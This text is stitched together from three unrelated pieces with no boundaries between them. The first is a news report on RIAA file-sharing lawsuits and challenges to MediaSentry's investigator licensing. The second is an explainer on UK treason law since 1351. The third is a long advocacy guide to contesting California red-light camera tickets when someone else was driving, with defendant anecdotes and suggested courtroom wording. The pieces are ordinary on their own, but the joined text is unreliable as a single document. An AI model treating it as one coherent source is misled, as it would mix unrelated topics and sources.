And Barack Obama does not use false charges and exaggerated claims to play politics with national security .
A Boston University student sued by the RIAA for copyright infringement has joined the chorus raising concerns about the legality of MediaSentry 's investigations .
Late last month , one of the Does in Arista Records v. Does 1 - 21 submitted a supplemental filing supporting his or her quest to prevent the RIAA from learning the identities of the Does .
According to the filing , the state of Massachusetts issued a cease - and - desist order to MediaSentry for " conducting private investigations of the students " without the appropriate license .
The unnamed student is asking the court to look into the matter further before allowing any evidence collected by the company to be considered .
As we 've noted before , the role of MediaSentry is crucial in the RIAA 's legal campaign .
The company is responsible for hunting down P2P users , downloading a handful of songs , and taking screenshots of the contents of their shared folders .
That information is then used as the basis for the John Doe lawsuits used by the RIAA to obtain the names and addresses of ISP subscribers .
The legality of MediaSentry 's actions has recently come under scrutiny in Lava Records v. Rolando Amurao , where the defendant has accused the RIAA 's investigators of operating as a private investigator without a license .
As is the case with the Boston University Doe , Amurao 's attorney is asking that the evidence collected by MediaSentry be thrown out , which would undercut the RIAA 's case .
The RIAA has since filed a motion to dismiss the case with prejudice , presumably so that it can file a new copyright infringement lawsuit against Amurao 's adult daughter , Audrey Amurao .
The RIAA referred Ars to SafeNet , MediaSentry 's corporate parent , but an RIAA spokesperson did say that the group 's belief is that MediaSentry is not an " investigator " under the statute in question .
SafeNet has not yet responded to our requests for comment .
The Boston University Does received a bit of unexpected support from the Electronic Frontier Foundation .
Yesterday , the EFF submitted an amicus brief supporting the Does ' motion to quash .
In the brief , the EFF raises issues that have been highlighted in other cases , including the RIAA 's boilerplate complaints and the RIAA 's argument that making a song available over a P2P network constitutes distribution under the Copyright Act .
During the Jammie Thomas trial , Judge Michael Davis ruled that the record labels need not demonstrate that actual distribution took place .
Instead , the presence of copyrighted music in Thomas ' shared folder was enough to constitute distribution .
That ruling was arguably a significant factor in the $ 222,000 verdict against Thomas .
The question of whether making available equals distribution has also been raised in Elektra v. Barker and Warner v. Cassin .

WHO , WHAT , WHY ?
The Magazine answers ...
There are plans afoot to change the laws on treason in the UK , with a commission on citizenship led by Lord Goldsmith recommending reform , but what is the law ?
There is an awful lot of statute law in the UK that deals with treason .
But the most important part was first passed in England in 1351 .
And it is perhaps one of the few pieces of 14th Century legislation to be regularly discussed in the 21st Century .
THE ANSWER
The essence of a law from 1351 remains in place
In recent times no - one 's really known how to change it
The original law said : " When a Man doth compass or imagine the Death of our Lord the King , or of our Lady his Queen or of their eldest Son and Heir ; or if a Man do violate the King 's Companion , or the King 's eldest Daughter unmarried , or the Wife the King 's eldest Son and Heir ; or if a Man do levy War against our Lord the King in his Realm , or be adherent to the King 's Enemies in his Realm , giving to them Aid and Comfort in the Realm . "
Or rather what the law actually said was in Norman French , but put succinctly in English , you can't kill , conspire against or wage war against the king and his family .
You also can't have sex with his wife , heir 's wife or his unmarried eldest daughter .
And the act goes on to rule out actions against the chancellor , treasurer and various categories of senior judge .
Precise definition
Treason existed before the 1351 act , but this was the first attempt to set parameters for it , says legal historian Prof Michael Lobban , of Queen Mary , University of London .
" We did have treason before but it was n't very well defined .
There was concern that the crown could manipulate a trial .
They wanted to give a precise definition to it . "
And this precise definition in England and Wales - and from 1708 in Scotland - has not changed a great deal over the years , despite a host of other treason acts .
WHO , WHAT , WHY ?
A regular part of the BBC News Magazine , Who , What , Why ?
aims to answer some of the questions behind the headlines
Some of the acts that have come since have been to change the punishment .
The 1814 act decreased to hanging a punishment that was traditionally described thus :
" [ To ] be drawn on a hurdle to the place of execution and there be hanged by the neck , but not until they are dead , but that they should be taken down again , and that when they are yet alive their bowels should be taken out and burnt before their faces , and that afterwards their heads should be severed from their bodies , and their bodies be divided into four quarters , and their heads and quarters to be at the King 's disposal . "
It took until 1998 and the Crime and Disorder Act to get the punishment further downgraded to life imprisonment .
Tumultuous times
Treason legislation has often been caught in political eddies .
After Henry VII ascended the English throne at the Battle of Bosworth in 1485 , he set the date of the start of his reign earlier than the battle and threatened the supporters of the defeated Richard III with treason .
Men who had defended the " rightful " king were being accused of offences against the usurping king .
So in 1495 , a treason act allowed a defence for those in this situation .
And the tumultuous political times of 1848 led to a treason act that dealt with people who advocated constitutional change rather than actual harm of the monarch .
Treason can only be committed by someone owing allegiance to the Crown , but nationals of friendly foreign countries do owe such allegiance while they are within the realm , as do foreign nationals abroad who have British passports .
Ministry of Justice
The Treason Felony Act 1848 makes it an offence to deprive or depose the Queen from her established constitutional position - and to publish any writing or printing advocating such change .
" It was aimed at Chartists and Irish radicals , " says Prof Lobban .
Six years earlier in 1842 , the law on attempts to " injure or alarm the sovereign " had been strengthened , with specific reference to the use of firearms , following an assassination attempt on Queen Victoria .
This law was used in 1981 to prosecute Marcus Sarjeant after he fired blank cartridges in the vicinity of the Queen .
He was jailed for five years .
One thing that can be said about the 1351 Treason
Act and its successors is that they have been debated more in the late 20th and early 21st Century than they have ever been used for actual prosecutions .
TREASON ACTS 1351 : Defines offence 1495 : Allows defence 1695 : Regulates trials 1702 : Bans hindering succession 1708 : English / Scottish law harmonised 1814 : Ends disembowelling etc 1842 : Deals with firearms , attempts to alarm monarch 1848 : Deals with radical agitation 1998 : Crime act ends death penalty
All acts still in force
It has been suggested Britons fighting for the Taleban or radical Islamist preachers could be charged with treason , while the Guardian newspaper has campaigned for the repeal of parts of the law .
But all of the above legislation remains in force , and a clear starting point for an overhaul may be an achievement in itself .
" Successive governments have recognised that there is a case for reviewing what is an extremely antiquated part of the law , " says a spokeswoman for the Ministry of Justice .
" Given that in modern practice the law is very rarely used , and there are no concrete proposals as a starting point for reform , the government has not been able to give priority to work in this area which would be at the expense of more pressing reforms . "
( Fighting ) Your Ticket Page :
- 3 -
" It 's Not Me ! "
Is the Ticket from a City in LA County , or from a Camera near a LA County MTA Busway or Light Rail Line ?
In June of 2011 we found out that the LA County Superior Court has not been reporting ignored tickets to the DMV !
For info about the option to ignore LA County red light camera tickets , go to Set # 2 on the LA County Documents page .
If it 's not you in the photo , you do n't have to identify the person driving .
Is your name on the ticket , but it 's someone else in the picture ?
In California , these tickets can put a point on your driver 's license , so they have to have a picture of your face .
A picture of your license plate does n't establish that you personally did the crime - it only establishes that your car did it , and anyone could have been driving your car .
There are two different " It 's not me ! " situations .
(1) If the police sent you a paper that looks like a ticket , but it does n't give the name and full address of the Court , or it says , " Do not contact the court " ( in small print on the back of the page ) , it may not be a real ticket at all ; it may be a fake ticket , what I call a " Snitch Ticket . "
Go to the section titled " Police Going Too Far ... , " above , to read about those .
(2) If your ticket gives the name and full address of the Court and says you are to go there or " respond to " the Court by a certain date , that 's a genuine ticket - keep reading here .
It 's a Real Ticket - but " It 's Not Me ! "
Is the mismatch between the person ticketed and the actual driver really obvious , like a combined age AND gender mismatch ?
If so , be sure to let me know about your ticket .
The easiest way to dispose of an " It 's not me ! " ticket is to give the police the name of the person who was actually driving .
But if you do n't want to turn them in , you do n't have to .
Even though there is no law
requiring you to identify the driver ,
most police departments , and even some courts ,
will tell you that you must .
Sometimes it is OK for the police to make such a false / misleading statement - they are allowed to lie , in order to investigate crime and get criminals to confess .
But it is not OK for the court to do so .
( If you want to read more about why you do n't have to ID the driver , scroll way down to the subsection titled " It's Not Me ! " - Why You Don't have to ID the Driver . )
" It 's Not Me ! " - First ( Optional ) Step ( of four ) : Contact the Police ?
Please be sure to read this First Step , even though contacting the police is totally optional .
And , before you take any action under this First Step , please read all of the Second Step , below .
If the ticket is in your name but it 's not you in the photo , and the photo is sufficiently clear that a comparison between it and your driver 's license photo would raise a strong doubt that it was you driving the car , you could call the police phone number that is usually printed somewhere on the ticket , and ask them to dismiss the ticket .
( Please note that doing this - contacting the police - is optional . )
If you get repeated busy signals , no reply to voicemails you have left , or end up talking to a clerk who keeps saying , " Please identify the driver , " you could try calling the Traffic Division at the police department directly , via the city hall operator , and asking for the officer who signed your ticket - or his boss .
And , you could , as many defendants do , make an appointment and go to the police department in person in hopes that you can convince them to dismiss your ticket .
Caveats - Beware !
1 . You can " dummy up " and refuse to tell the police who was driving your car , but it is illegal to send them on a Wild Goose Chase by filling - out the affidavit ( a.k.a . " Section D " ) with the name of someone who does n't exist .
2 . If you were the driver but are not named on the ticket , you should not be the one to contact the police .
Leave that to the registered owner ( " R.O. " ) , or whoever is named on the ticket .
3 . Once your " It 's not me ! " ticket has been dismissed against you , the police are free to issue the ticket to someone else .
They have several ways to find the other driver .
If their workload allows them the time , they can use their computer to look at all driver 's licenses with the same mailing address as yours , and compare the photos .
If that does n't work , they can pull up the citation history for your car , check out any old tickets issued to someone other than you , and look at the photos of those drivers .
Or look around on your Facebook page .
4 . When you are named on the ticket but it was not you driving , it is actually better if the face photo is a clear one .
Some judges , when presented with a blurry photo and an " Are you sure it 's me ? " motion from a defendant who has n't volunteered to identify the driver , will find the defendant " guilty " anyway .
Here is a transcript ( Hawthorne ) where the judge came very close to doing that .
5 . If you have filled out the affidavit and sent it in , but have not been able to confirm that the ticket against you has been dismissed , you still will have to take action by the " Respond to the Court " date shown on the ticket - or before the expiration of any extension you have obtained .

Notes from Defendants
The first of these notes suggests that contacting the police may be a waste of time , or it could even make things worse !
" I phoned the police department for my mother in order to have them dismiss any action against her ( my 82 year old father was driving ) .
After harassing me to give him the name of the driver ( and my refusal to do so ) , the police officer was able to look up my father 's driver 's license photo [ since his license was at the same address as my mother 's ] .
The citation came in the mail a few days later . "
A visit to the PD :
" The picture of the driver in my ticket was blurry so I went to meet with the police to review the video and zoomed - in photos .
Immediately , the person there was convinced that I could n't have been the person driving .
Like your website stated many times , this person insisted that I identify who was driving the vehicle .
This person explicitly told me that the responsibility to ID the driver was on my shoulders .
I did n't want to argue with the police officer at this time so I remained silent and gave a blank look .
My only intention today was to gather data and observe reaction .
I then asked a simple question about contesting the ticket .
Without answering my question , this person told me not to ask for a court date but instead ID the driver and let the new person go to court instead .
They further threatened that if I did not ID the other driver , they will look up all drivers at my residence and try to do a matching .
[ See the purple " Caveats " box , above , about " matching . " ]
I told them politely to go ahead and do it , and left the building . "
In most cities , there 's a lot of arm twisting going on !
Another phone call to the PD :
" I received a red light ticket in the mail .
The picture was not clear .
The ticket was issued in June but I did n't get the notice until October .
They had an incorrect address .
I called the # on the ticket ( it was a real ticket , not a Snitch Ticket ) and spoke to the officer .
I told him that it was n't me .
I asked if HIS picture was clear .
He told me it was crystal clear ( a lie ) .
I said that in that case I would go to court and get a court date and we would have the judge decide if it was me or not .
He said that if I would work with him he could take care of it over the phone .
I said what can you do ?
He put me on hold for several minutes and came back and told me that they had a new system and it was hard to figure out ( another lie ) , and to hold on again .
I held for several more minutes until he came back on and said , ' Since it is n't you I will dismiss it right now . ' "
Another visit to the PD - with narrative by the defendant and his mom .
The defendant wrote :
" I appeared at the red light police officer 's office .
He asked me who was driving and when I said it was not me he drilled me as to who was in the picture .
He kept telling me I must know the person and needed to tell him .
Then another officer came over , told me he thought I was protecting a family member and said I must know who it was and that I needed to tell him .
Thanks to your website , I learned the law does not require me to say anything other than ' it is not me . ' "
From the defendant 's mom : " My son explained that he has a sister and maybe one of her friends took the car to go out for pizza or something , and went on to state he rarely if ever comes to [ the city where the violation occurred ] for any purpose ( it is about 40 miles from his residence ) and again reminded the officer he was there because he needs to have this ticket removed from his DMV driving record and it was preventing him from renewing his license .
The first officer again said , ' Who was driving ?
You had to know , you got to know who is driving your car . '
My son replied respectfully , ' Hey guys , I know it is not me . '
He mentioned again that he needed the ticket dismissed so that he could renew his license .
The main officer then said ' Well , I guess we have no choice but to dismiss it . ' "
The defendant wrote : " These guys really work overtime to force you to say who was driving .
They would not give me anything in writing that I could take to a judge to expedite the [ renewal of my license ] . "
First Step , continued ...
Based upon emails I 've received from defendants , many police departments are threatening , like the ones depicted above - or worse .
But there could be exceptions .
Here is the letter one department ( West Hollywood ) sent to a defendant who had a question about his " It 's not me ! " ticket .
" This is not a problem for you .
If you are not the driver of the vehicle , then you are not guilty of anything .
The law simply requires that we mail these citations to the registered owner of the photographed vehicle .
" The easiest way to resolve this problem is to come in and see me .
I take appointments every Wednesday between 9:30 and 11:30 am .
I take walk - ins as well as scheduled appointments .
I 'll examine the photos and if you are not the defendant or if the photograph is not legible , then I 'll dismiss it .
It 's that simple and the process takes less than 2 minutes .
We are located at the West Hollywood Sheriff 's Station 720 N. San Vicente Blvd West Hollywood , CA 90069 .
Phone ( 310 ) 855-8850 ext. 505 . "
You do not have to tell the police who the driver was , either when you are talking to them , or by filling out the spaces on the back of the ticket .
One police department has even admitted that on TV ...
" ...sure , we think that you should identify the violator ....
But there 's no law that says you have to do that . "
Bakersfield Police Public Information Officer Det. Mary DeGeare , on KGET , July 20 , 2005 .
The full text of the story is below .
Or watch it .
Anchor Robin Mangarin : Red light cameras can catch you red handed , but what if you were n't the one behind the wheel ?
Should you be compelled to snitch on your wife or kids if they get caught running a red light ?
KGET - 17's Kiyoshi Tomono has the story of a Bakersfield man who faced that very dilemma .
Reporter Kiyoshi Tomono :
A flash of light and suddenly you 're caught on camera and getting a ticket for running a red light .
It happened to local lawyer Bill Slocumb .
Thing is , neither he nor his wife was behind the wheel .
" My stepdaughter ran the red light southbound on Coffee Road onto Truxtun Avenue , " said Slocumb .
But Slocumb's wife got the $ 350 ticket .
In the same envelope was a form encouraging the couple to divulge who may have been driving if it was n't them .
They decided to fight in court .
Slocumb said the judge did n't push the issue and dismissed the ticket , but the Bakersfield police still wanted to know who was driving .
" The officer who apparently runs the red light program demanded [ during a phone conversation before the court session ] to know the name of the driver , the address of the driver , whether I knew if she was a California licensed driver or not , and we simply told him that we were not interested in providing that information , " said Slocumb .
But does the officer 's request or the city 's form have any teeth ?
Police said it 's a matter of civic duty and safety .
" If someone is driving your car and they run the red light and they [ or you ] get the notification , sure , we think that you should identify the violator , " said Det. Mary DeGeare from the Bakersfield Police Department .
" It 's an infraction .
It 's a red light violation .
But there 's no law that says you have to do that . "
DeGeare said not being able to identify the driver is not the norm .
" There 's a process in place that helps us identify who the driver is , " she said .
" We 're able to compare , usually , the violator 's photo to their driver 's license photo . "
Reporter Tomono : Bottom line , read the fine print .
Slocumb said he thinks he 's lucky because he 's a lawyer .
" I guess it was a happy ending and we moved on with our lives , " he said .
From KGET -TV , with emphasis added , and with clarifying notes in [ ] .
First Step , more ...
While you 're there , get your Late Time !
And , write down the names of the officers you talked with .
( That info may come in handy later . )
If you have decided to visit the police , and your ticket was issued by one of the Nestor / ATS cities that does n't print the Late Time on the ticket , or by an ACS camera that prints it so small and fuzzy that you can't read it , then while you are at the station be sure to ask the police to show you your Late Time .
( For more info about these tickets with missing or illegible Late Times , see Defect # 5 and the How to Read Your Late Time box in Defect # 7 . )
First Step , almost done ...
If It Obviously was n't You , Should the Police Even have Filed the Charges ?
The lack of Probable Cause was discussed in the landmark 2001 decision which closed - down San Diego 's first camera system .
The judge wrote :
" Gender Mismatches "
" The most disturbing testimony at this hearing came from Officer Smalley who testified that even when he had a 95 percent belief that the individual in the photograph was not the registered owner because of a fairly obvious gender difference , he would issue the citation on the theory that he was not 100 percent certain .
This procedure has been halted over the objection of Officer Smalley .
The police now do not issue citations where there is an obvious gender discrepancy between the driver and registered owner .
Further , the prosecution has moved to dismiss the gender mismatch cases pending in this court .
Therefore , there is no need to analyze whether such a prior procedure constituted outrageous governmental conduct . "
From Section III ( B ) ( 2 ) of Judge Ronald Styn's Aug. 15 , 2001 ruling in People v. John Allen .
In 2014 there was another trial court decision about Probable Cause , in People v. Tho --.
Also see Defect # 10 - E ( on the Home page ) and Set # 16 on the Culver City Docs page .
Some recent contracts specify that where there is a gender mismatch , the police are to mail out a fake / Snitch Ticket rather than filing charges ( a Notice to Appear ) at the court .
This defendant got his gender mismatch ticket dismissed by writing to the PD :
" Dear Officer ______ , On Sept. 4 , 2007 I spoke to you regarding citation # _______ which you issued to me on Aug. 14 , 2007 .
In that conversation I informed you that I was living in ( another state ) and had been since April of 2007 and that I had not received the photo evidence used by you to issue the citation .
After you stated to me that  It could n't be you because it is a female driving the car ,  it was mutually agreed that the driver of the vehicle shown in the photo was not the same person named in the citation .
You then asked me to nominate the driver .
I replied that I would not nominate anyone without seeing the photos first .
I requested that you send me a copy of the photographic evidence so that I could review it .
I have received the photos and after careful review I am unable to identify the driver shown in the photos .
The photo quality is very poor and the driver appears to be wearing large sunglasses that cover most of the face .
I am unable to positively identify the person driving in the photo you sent me and therefore cannot nominate the driver of the vehicle .
I am enclosing a color photocopy of my valid Calif .
Drivers License and my valid ( other state 's ) Identification Card .
Both can be verified through DMV records .
Both have a clear photo of myself .
When compared to the driver in the photographic evidence you sent me there is clearly no evidence that the person named in the citation is the same person driving the vehicle on the date and time indicated .
Based on the comparison of the citation photo and the ID / CDL photos included I hereby request that you dismiss the citation .
Respectfully ,
If you visited the police but they refused to dismiss your ticket despite an obvious gender or age mismatch , and there is no way they would be able to find out who was driving your car ( see the purple " Caveats " box , above ) , you could file a claim against the city for the wages you will lose while attending court due to their " outrageous governmental conduct . "
If you file the claim well before your scheduled arraignment date , maybe the city attorney will figure out that it 's best to dismiss your case before your claim mounts up .
Claim forms can be obtained by phoning the city attorney 's office .
Or , you could contact the " public integrity " or " justice system integrity " division of the local district attorney 's office , and complain to them .
Or , you could contact the Bar Association and file a complaint against the city attorney or city prosecutor , for filing charges despite a lack of Probable Cause .

" It 's Not Me ! " - Second ( Optional ) Step ( of four ) : Get an Arraignment Date ?
The New " No Bail " Privilege Could Be a Trap for You !
A June 2015 amendment to the Rules of Court allows defendants to schedule a " not guilty " court trial without posting bail .
But be warned :
If a defendant sets up a trial date without posting bail and then fails to show up for the trial , the judge is likely to issue a bench warrant and / or suspend the defendant 's license .
So , defendants who are not so good about making it to important appointments should think twice before taking advantage of the new " no bail " privilege .
It does not apply to Trial by Declaration .
It does not apply to trials requested by mail .
Rule 4.105 at the California Courts website
Report considered by the Judicial Council prior to its adoption of the new rule
More info about the new " no bail " privilege :
It does not apply to Trial by Declaration .
It does not apply to trials requested by mail .
If you decided not to contact the police , or you did and the police refused to dismiss , " twisted your arm " to try to get you to identify the driver , or are just dragging their feet and wasting your time , you could call the court and get an arraignment date .
( If it is inconvenient for you to come to an in - court arraignment in person , do n't make an arraignment date .
Instead , see the " It 's Not Me ! " - Third ( Optional ) Step : Trial by Declaration section , below . )
If you 're not sure what an arraignment is , see the big green Confusing Courthouse Terminology box , further down this page .

Sneaky Lies Encountered While Handling It 's Not Me! Tickets
2 ) On the back of some real tickets ( a Notice to Appear ) , it may say that you " must " fill out the form .
That sort of deceptive language is OK on a fake ticket , but not OK on a real ticket - because a real ticket is a court document , with a court - prescribed format .
If you receive a real ticket saying that you must fill out the form and identify the driver , please let me know right away .
The position of the word " must " is important .
It 's OK if it says ,
" If you were not the driver , complete the Identify New Driver form and return it in the enclosed envelope .
You must complete all the information regarding this citation for your name to be considered for dismissal .
If you do not complete all the required fields , this citation will remain in your name . "

I went to the SF Hall of Justice today to request a trial ( based on  It s not me ) .
The clerk immediately asked me if I was driving , and when I said no she said ,  You have to fill this out and tell who it was . 
I told her I didnt want to do that and that I wanted a trial .
 You cant have a trial unless you tell who it was ,  which I knew wasnt true .
I said ,  I believe I m not obliged to say who it was , and I can have a trial . 
She said ,  They re just gonna make you tell them at the trial ,  and I said ,  I believe I am not legally required to say . 
After that she more or less threw a sheet at me and told me to pick a trial date .

6 ) Even those innocent - looking courthouse phone / window clerks may have been trained to try to get you to identify the driver !
Many have been instructed to refuse your request for a TBD or an arraignment or trial date , to tell you that if it was not you driving the car , you cannot have a TBD or arraignment or trial .
They insist that you must either fill - out and submit the affadavit , or contact the police .

Runaround by the court staff :
" I had success for a red light ticket issued by the _____ Police Dept .
I happened not to be the driver of the car , so I ignored the advice of many police and court employees , and followed your advice to request a trial and plead the " not me " defense .
My initial attempts to get the ticket dismissed by ticket issuing authorities failed .
The driver was a female with blonde hair , I am a male with no hair .
It was pretty obvious that I was n't the violator , but the police continued to play hardball to get me to submit the name of the driver in the ticket picture .
I kept pressing for a trial .
It took multiple calls to multiple agencies before I began to get any information regarding a court trial .
I kept getting the story that a trial was n't an option and that I had to ID the driver to get out of the ticket .
I eventually got the appropriate information , mailed in two requests for a court date , and submitted bail .
On a follow up call two weeks after my second request for a court trial , I spoke to a supervisor in the courthouse .
He forwarded my request to the police for review .
I think he was hesitant to assign a trial date because he understood the futility of a trial .
A few days after speaking to the courthouse supervisor , I received my bail check and a note indicating that the police had dismissed the ticket .
Success thanks to you and your website . "
If you encounter arm - twisting and / or false statements coming from a court clerk or a judge , please send me all available details !
I wrote back and asked this defendant what his ticket looked like , and he replied :
" The front of my red light ticket followed the official format - the court 's address and phone number were supplied on the front of the ticket ; however , the back of my ticket ( highlighting added by highwayrobbery .
net ) , which give instructions for handling the ticket , provided vague and misleading information .
The instructions that I received from the ticket handling agency in Arizona , the police , and the Superior Court , was to either pay the ticket or provide the required information of the driver of the car in the picture .
No additional options were mentioned to me .
This was told to me by a minimum of eight different people .
The cop at the PD was both loud and insistent on this point .
I was told on several occasions by clerks at the Superior Court that they COULD NOT give me a court date unless I agreed to being the person pictured in the car .
Here was their rationale :
' The purpose of a trial is to judge the guilt or innocence of the person driving the car .
As I was not the person driving the car , I could not request a trial .
Only the driver pictured in the ticket could request a trial .
Please provide the name and CDL# of the driver and they can request a trial . '
Only after insisting to speak to a supervisor or the supervisor of the supervisor , was I given instructions for requesting a court date . "
The editor of highwayrobbery .
net phoned this same court , and got the same runaround .
With two different clerks !
And , looking at the back of the defendant 's ticket , there were four prominent mentions of " complete the affidavit " ( a.k.a. " Section D " ) and only one mention , in the smallest type size , of the availability of a court hearing .
( A request you could make at arraignment would be for your ticket to be moved to a different courthouse .
See Change of Venue on the Challenges page . )
Second Step , continued ...
You could take your ticket with you to your arraignment and tell the judge , " Not guilty - identity " or , " Not guilty - wrong defendant . "
Even though this verbal approach could end up being a waste of your time , here are details .
Saying only the correct words is important - a judge can't force you to identify who it is in the photo , unless you give up your right to not testify - by testifying .
So , you may want to avoid making statements that the judge might consider to be testimony , such as , " I was not driving the car , " or even " It 's not me ! " ( Maybe I need to change the title of this section ! )
If you know that it actually is you in the photo , you definitely can't say " It 's not me ! " as that would be perjury .
See FAQ # 21 on the Links page for more information about perjury .
As soon as he hears you question identity at arraignment , a good ** judge will ask to look at your copy of the ticket ( or he may ask the bailiff to look at it ) - after all , all judges know that they 're not supposed to send an obviously " wrong defendant " to a trial .
Then he may dismiss the ticket .
Here 's an example of a good judge .
" I got whacked with a collection letter for almost $ 700 .
I called the collectors and found out I 'd been charged with a camera violation .
I called the cops and asked for the photo ticket that I never received ( must have been mailed to my former address in another state ) .
The officer e-mailed me the ticket .
When I saw it , it was quite clear that my wife was the driver -- though the ticket was issued to me ( as per my registration of course ) .
The picture was clearly a female driver .
My name is Ralph -- clearly a man 's name .
Anyhow , after reading through your site , I decided to go down to the police station and ask them to drop the charge .
The officer there said , ' No problem , just gimme the name of the cupcake driving and I 'll be happy to drop the charge against you . '
Disgusted , I turned on my feet and walked out .
To which the officer said quite threateningly , ' Good luck in court , pal . '
The arraignment date came , I saw the judge -- entered my plea of ' not guilty - identity . '
He asked if the basis of my defense was that I was n't the operator .
I nodded .
He asked if I had a copy of the ticket .
I gave it to the bailiff , the bailiff gave it to the judge .
He looked at it for a millisecond , and dismissed the case .
Nice judge .
BAD cop .
It 's like you said , a good judge does n't wanna waste their or my time on a cr--shoot with no evidence . "
Here 's an example of a bad judge .
A clever bad judge .
" When the judge called my name , I plead not guilty and told the judge I was not the driver .
She looked up and asked for my ticket and my driver license .
After looking at it for a while , she said , ' It is too blurry , you might have to set up a trial . '
And then she said : ' Let me help you out here .
Im not going to ask you who was the driver , but do you know who that person is ? '
I did not know what to respond so I kept silent , she asked me twice and she got a little bit upset , saying that 's OK , you dont have to take the help from me , Ill just put not guilty  here and you can go ahead and pay your bail and set up a court trial .
A good ** judge wo n't ask " Who is it ? "
But if your judge does , remind him that you have pled " not guilty " and have not given up your right to not testify , and ask him ( politely , " With all due respect ... " ) to either dismiss the case , or set it for trial , or Trial by Declaration .
( If the judge refuses to dismiss the case , and you can't afford putting up the full fine amount as bail , then you may want to consider taking advantage of the new " no bail " privilege . )
If you ended up pleading " not guilty , " you will next need to see the courtroom clerk , who will give you papers documenting what your trial date will be and also will collect the bail , if you need to post it .
This is supposed to be a straightforward and businesslike transaction , but if your judge is one of those who asks " Who is it ? , " you may encounter more of the same from the clerk !
The clerk may try to intimidate you into filling out the form disclosing who the driver was ; he may even say that you must fill it out .
If telling him that you know that you do n't have to fill out the form does n't stop the pressure , simply tell the clerk that you 'd like to see the judge again , to verify what the clerk has told you .
If the arraignment judge said that he thought it might be your face in the photo , and you responded by asking for a trial , then in the days after the arraignment you may want to do a Peremptory Challenge , so that you will have a different judge at the trial of your " It 's Not Me ! " ticket .
Second Step , continued ...
More Info about Arraignment
** With an " It 's not me ! " ticket , the outcome depends upon the fairness of the judge .
If you would like to move your case away from a particular judge , or even totally away from the local courthouse , see Peremptory Challenge and Change of Venue , on the Challenges page .
In the past , many arraignment judges had a computer terminal on their bench , giving them instant access ( via the Internet ) to the camera company 's digital copies of ticket photos .
Before the arrival of these computers , when a defendant at arraignment told them " Not guilty - wrong defendant ! " or " Not guilty - identity , " the arraignment judges had to make their decision based upon looking at the face photo printed on the defendant 's copy of the ticket .
Many of those photos were poorly printed and indistinct , so the judge often had to tell the defendant to plead " not guilty " and come back for a trial .
Now it is rare to see a judge do these computerized comparisons , because using the computer took an extra minute of the judges ' time , and also made it much easier for It 's Not Me defendants to get a dismissal " on the spot " without having to come back for a trial .
" It 's Not Me ! " - Third ( Optional ) Step ( of four ) : Do a Trial by Declaration ?
Trial by Declaration ( " TBD " ) on an " It 's not me ! " ticket is suitable for either of these two situations :
(1) The mismatch between you and the driver is very clear , and it is inconvenient for you to come in for a court appearance , or
(2) You wish to exercise your right to have the question of identity considered multiple times - at arraignment , in a TBD , and possibly in a Trial de Novo .
Trial by Declaration is discussed at the end of the Handling Your Ticket section near the bottom of this web page , under the heading " TBD Situation # 3 . "
" It 's Not Me ! " - Fourth Step ( of four ) : Trial
If it is inconvenient for you to come to a court trial in person , do n't make a trial date right away .
You could try a Trial by Declaration ( above ) .
If you are going to a trial on an " It 's not me ! " ticket , you should read all of Defect # 1 on the Home page , and also the Handling Your Ticket section , below .
" If there is any other advice to give readers please advise them
to park in a lot or a garage vs. at meters .
I lost count of the number
of people I encountered who had to leave the courtroom to go feed their meter
and missed out on important information .
Plus , the whole time they were stressing
about their meter instead of paying attention to what was happening in the courtroom . "
Once you get to the courthouse for your trial , hang on tight !
The officer who is there representing the city knows that a police agency is not supposed to file charges against someone when there is strong evidence that someone else committed the crime - in other words , a lack of Probable Cause .
The officer also knows that if he does so , repeatedly , a judge may " call " him on it , as these judges did .
" Gender Mismatches "
" The most disturbing testimony at this hearing came from Officer Smalley who testified that even when he had a 95 percent belief that the individual in the photograph was not the registered owner because of a fairly obvious gender difference , he would issue the citation on the theory that he was not 100 percent certain .
This procedure has been halted over the objection of Officer Smalley .
The police now do not issue citations where there is an obvious gender discrepancy between the driver and registered owner .
Further , the prosecution has moved to dismiss the gender mismatch cases pending in this court .
Therefore , there is no need to analyze whether such a prior procedure constituted outrageous governmental conduct . "
From Section III ( B ) ( 2 ) of Judge Ronald Styn's Aug. 15 , 2001 order in People v. John Allen , the landmark case that closed - down San Diego 's first red light camera system .
Another trial court decision about the lack of Probable Cause is the 2014 decision in People v. Tho --.
Also see Defect #
10 - E on the Home page and Set # 16 on the Culver City Docs page .
The officer knows that he needs to avoid letting the trial go to the point where the judge sees the obvious mismatch between your face and the face in the photo on the ticket .
The officer 's plan will be to wait for your case to be called , and then once you are walking forward , to quickly ask the court to dismiss the case .
But he also knows that the average defendant does n't know about these problems , so in the minutes before the courtroom doors open and / or the judge comes in , the officer will try to bluff you into giving up , changing your plea to " guilty . "
See the trial examples below , written by other defendants .
If that bluff does n't work , then he ( with the assistance of the court ) will also try to " bribe " you into giving up :
Before the judge comes in , many bailiffs offer traffic school to everyone there who has not had it in the last 18 months .
They do n't have to make that offer - once you plead " not guilty " the granting of traffic school is optional , at the judge 's discretion - but it works to the court 's advantage as it gets a lot of defendants to leave so that there 's not so many cases to be heard .
At a trial , the judge can't force you to identify who it is in the photo , unless you give up your right to not testify - by testifying .
So , you may want to avoid testifying , or making statements that the judge might consider to be testimony , such as , " I was not driving the car , " or even " It 's not me ! "
At a trial , the burden of proof is on the People , so the officer will talk first .
After the officer has shown his evidence to the judge and it is your turn to talk , you could make a motion by saying , " Your honor , are you sure it 's me ? "
Or , " Your honor , I request dismissal because the pictures do not show beyond a reasonable doubt that it was me driving the vehicle . "
Or , even more formally , " I move to dismiss , on the grounds that the prosecution has not proven , beyond a reasonable doubt , the element of identification of the driver . "
Or , " Your honor , would you convict a bank robbery suspect on such blurry photos ?
This also is a criminal matter ... the burden of proof is the same . "
Whichever of the above wordings you decide to use , write it down ahead of time , and then when you get to court , read it to the judge Don't ad lib !
If you want to be very sure that the judge understands that you are not testifying , you could tell the judge , before you make the motion above , that you do n't intend to testify , that you plan to remain silent ( except for making the motion ) .
Or , you could substitute the words " the defendant " or " this defendant " wherever " me " or " I " occurs in the motion .
If , despite all your precautions , the judge asks you if you were the driver , one or both of the following replies would be appropriate .
" Your honor , that 's a factual determination for the court to make . "
" Your honor , I 'm exercising my right to remain silent . "
If the judge claims that the wording you used ( " Are you sure it 's me , " etc. ) was testimony and that by saying those words you gave up your right to remain silent - and so wo n't stop asking you who the driver was - you could point out to him that the wording you used was identical to what a lawyer representing ( a silent ) you would have said if the pronouns " me " and " I " were changed into " my client , " that you spoke those words while acting as your own lawyer , not as testimony - and that you retain your right to remain silent .
The judge should understand that what a lawyer says is not testimony .
I strongly recommend that you make a request that your trial be recorded .
